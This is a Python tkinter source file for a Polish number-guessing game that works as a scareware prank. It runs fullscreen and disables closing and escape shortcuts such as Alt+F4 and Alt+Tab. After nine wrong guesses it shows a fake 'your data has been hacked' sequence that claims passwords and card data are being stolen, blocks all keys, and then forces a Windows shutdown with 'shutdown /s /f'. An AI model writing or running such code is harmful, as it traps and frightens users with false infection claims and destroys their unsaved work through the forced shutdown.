import tkinter as tk
import os
import time

# === LICZBA DO ODGADNIĘCIA ===
WYLOSOWANA = 67
max_prob = 9
proby = 0

# === FUNKCJA WYŁĄCZANIA KOMPUTERA ===
def wylacz_komputer():
    try:
        os.system("shutdown /s /f /t 10")
    except:
        pass

# === FUNKCJA ZAKAŻENIA ===
def zablokuj_system():
    okno.withdraw()
    
    okno_hack = tk.Toplevel()
    okno_hack.attributes("-fullscreen", True)
    okno_hack.configure(bg="black")
    okno_hack.attributes("-topmost", True)
    okno_hack.protocol("WM_DELETE_WINDOW", lambda: None)
    
    def blokuj_wszystko(event):
        return "break"
    
    okno_hack.bind_all("<Key>", blokuj_wszystko)
    
    ramka = tk.Frame(okno_hack, bg="black")
    ramka.place(relx=0.5, rely=0.5, anchor="center")
    
    tytul = tk.Label(ramka, text="⚠️ TWOJE DANE ZOSTAŁY ZHAKOWANE! ⚠️", 
                     font=("Arial", 36, "bold"), bg="black", fg="red")
    tytul.pack(pady=20)
    
    dane_label = tk.Label(ramka, text="", font=("Arial", 18), bg="black", fg="lime")
    dane_label.pack(pady=10)
    
    dane_do_wyslania = [
        "📁 Pobieranie danych z dysku...",
        "🔑 Odczyt haseł...",
        "📧 Kopiowanie kontaktów...",
        "💳 Zbieranie danych kart...",
        "📡 Przesyłanie danych na serwer..."
    ]
    
    for dane in dane_do_wyslania:
        dane_label.config(text=dane)
        okno_hack.update()
        time.sleep(0.5)
    
    for widget in ramka.winfo_children():
        widget.destroy()
    
    komunikat = tk.Label(ramka, text="⚠️ KOMPUTER ZOSTAŁ ZAINFEKOWANY! ⚠️", 
                         font=("Arial", 40, "bold"), bg="black", fg="red")
    komunikat.pack(pady=30)
    
    info = tk.Label(ramka, text="Nie odgadłeś liczby w 9 próbach.\nSystem zostaje wyłączony.", 
                    font=("Arial", 24), bg="black", fg="white")
    info.pack(pady=30)
    
    licznik = tk.Label(ramka, text="Wyłączanie za 10 sekund...", 
                       font=("Arial", 28), bg="black", fg="yellow")
    licznik.pack(pady=20)
    
    for i in range(10, 0, -1):
        licznik.config(text=f"Wyłączanie za {i} sekund...")
        okno_hack.update()
        time.sleep(1)
    
    wylacz_komputer()

# === OKNO GRY ===
okno = tk.Tk()
okno.title("Zgadnij Liczbę - Ocal swój komputer!")
okno.attributes("-fullscreen", True)
okno.configure(bg="black")  # TŁO CZARNE
okno.protocol("WM_DELETE_WINDOW", lambda: None)

# === BLOKADA SKRÓTÓW ===
def blokuj_skroty(event):
    if event.keysym == 'F4' and event.state & 0x00020000:
        return "break"
    if event.keysym == 'd' and event.state & 0x0008:
        return "break"
    if event.keysym == 'm' and event.state & 0x0008:
        return "break"
    if event.keysym == 'Tab' and event.state & 0x00020000:
        return "break"
    if event.keysym == 'L' and event.state & 0x0008:
        return "break"
    return None

okno.bind_all("<Key>", blokuj_skroty)

# === TYLKO CYFRY I ENTER ===
def tylko_cyfry_i_enter(event):
    if event.char.isdigit() or event.keysym == 'Return' or event.keysym == 'BackSpace' or event.keysym == 'Delete':
        return True
    else:
        return "break"

# === GŁÓWNY INTERFEJS ===
ramka_glowna = tk.Frame(okno, bg="black")  # TŁO RAMKI CZARNE
ramka_glowna.place(relx=0.5, rely=0.5, anchor="center")

tytul = tk.Label(ramka_glowna, text="🔢 ZGADNIJ LICZBĘ (1-100) 🔢",
                 font=("Arial", 48, "bold"), bg="black", fg="red")  # CZERWONY TEKST
tytul.pack(pady=30)

komunikat = tk.Label(ramka_glowna, text=f"Wpisz liczbę (pozostało prób: {max_prob})",
                     font=("Arial", 28), bg="black", fg="red")  # CZERWONY TEKST
komunikat.pack(pady=20)

# POLE WPISYWANIA - CZERWONE TŁO
entry = tk.Entry(ramka_glowna, font=("Arial", 36), justify="center",
                 width=10, bg="red", fg="white")  # CZERWONE TŁO, BIAŁY TEKST
entry.pack(pady=20)
entry.focus()
entry.bind("<Key>", tylko_cyfry_i_enter)

def sprawdz():
    global proby, max_prob
    try:
        strzal = int(entry.get())
        proby += 1
        pozostalo = max_prob - proby
        
        if strzal < WYLOSOWANA:
            if pozostalo > 0:
                komunikat.config(text=f"📉 ZA MAŁO! Pozostało prób: {pozostalo}", fg="orange")
            entry.delete(0, tk.END)
            entry.focus()
        elif strzal > WYLOSOWANA:
            if pozostalo > 0:
                komunikat.config(text=f"📈 ZA DUŻO! Pozostało prób: {pozostalo}", fg="orange")
            entry.delete(0, tk.END)
            entry.focus()
        else:
            # WYGRANA - ZIELONE TŁO
            ramka_glowna.config(bg="green")
            okno.configure(bg="green")
            tytul.config(text="🎉 GRATULACJE! 🎉", fg="white", bg="green")
            komunikat.config(text=f"✅ OCALIŁEŚ SWÓJ KOMPUTER! ✅\nOdgadłeś {WYLOSOWANA} za {proby} prób!", 
                             fg="white", bg="green", font=("Arial", 32, "bold"))
            entry.config(state="disabled", bg="white")
            przycisk.config(state="disabled", bg="gray")
            przycisk_wyjscie.pack(pady=30)
            return
        
        if proby >= max_prob:
            zablokuj_system()
            
    except ValueError:
        komunikat.config(text="⚠️ TO NIE JEST LICZBA! Wpisz liczbę!", fg="red")
        entry.delete(0, tk.END)
        entry.focus()

# PRZYCISK - CZERWONY
przycisk = tk.Button(ramka_glowna, text="✅ SPRAWDŹ ✅",
                     font=("Arial", 28, "bold"), bg="darkred", fg="white",
                     command=sprawdz, width=12, height=1)
przycisk.pack(pady=20)

entry.bind("<Return>", lambda event: sprawdz())

def zamknij():
    okno.destroy()

# PRZYCISK WYJŚCIA - CZERWONY
przycisk_wyjscie = tk.Button(ramka_glowna, text="🚪 ZAKOŃCZ PROGRAM 🚪",
                              font=("Arial", 24, "bold"), bg="darkred", fg="white",
                              command=zamknij, width=15, height=1)

okno.mainloop()